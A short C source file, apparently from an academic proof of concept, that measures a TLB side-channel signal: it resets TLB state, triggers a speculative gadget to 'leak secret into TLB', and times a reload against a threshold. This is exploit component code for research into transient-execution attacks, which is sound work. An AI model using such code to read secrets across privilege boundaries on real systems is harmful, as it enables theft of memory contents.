/* TLB signal measuring and processing.
 *
 * Date: November 23, 2023
 * Author: Mathé Hertogh - Vrije Universiteit Amsterdam
 */

#include "slam.h"

void signal_reset(int reload_idx)
{
	char *reload_ptr = reload_buf() + reload_idx*PAGE_SIZE;
	cpuid();
	load(reload_ptr);
	cpuid();
	evict_l1tlb();
	cpuid();
}

uint64_t signal_raw_read(int reload_idx)
{
        return reload(reload_idx);
}

uint64_t signal_get(void *secret_ptr, int reload_idx)
{
	signal_reset(reload_idx);
	gadget_trigger(secret_ptr); // Warm up the secret.
	gadget_trigger(secret_ptr); // Leak secret into TLB.
	return signal_raw_read(reload_idx);
}

int signal_hit(void *secret_ptr, int reload_idx)
{
        return signal_get(secret_ptr, reload_idx) <= THRES;
}
